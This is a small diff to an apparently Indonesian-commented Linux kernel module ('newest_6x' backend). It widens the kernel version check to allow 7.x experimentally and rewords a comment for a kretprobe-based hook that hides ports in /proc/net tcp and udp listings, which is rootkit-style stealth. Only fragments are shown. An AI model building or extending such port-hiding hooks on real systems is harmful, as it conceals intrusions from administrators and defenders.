@@ -41,8 +41,8 @@
 #include <linux/workqueue.h>
 #include <linux/kmod.h>
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(6,9,0) || LINUX_VERSION_CODE >= KERNEL_VERSION(7,0,0)
-#error "backend newest_6x hanya untuk kernel >=6.9 && <7.0"
+#if LINUX_VERSION_CODE < KERNEL_VERSION(6,9,0)
+#error "backend newest_6x hanya untuk kernel >=6.9 (termasuk jalur 7.x EKSPERIMENTAL)"
 #endif
 #if !defined(CONFIG_X86_64)
 #error "backend newest_6x hanya untuk x86_64"
@@ -357,7 +357,7 @@ static int gd_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 
 static struct kretprobe rp_gd;
 
-/* ================= hook conn (hide port di /proc/net/*) ================= */
+/* ================= hook conn (hide port di /proc/net tcp+udp) ================= */
 static bool hex4(const char *p, const char *end, unsigned int *out)
 {
 	unsigned int v = 0;
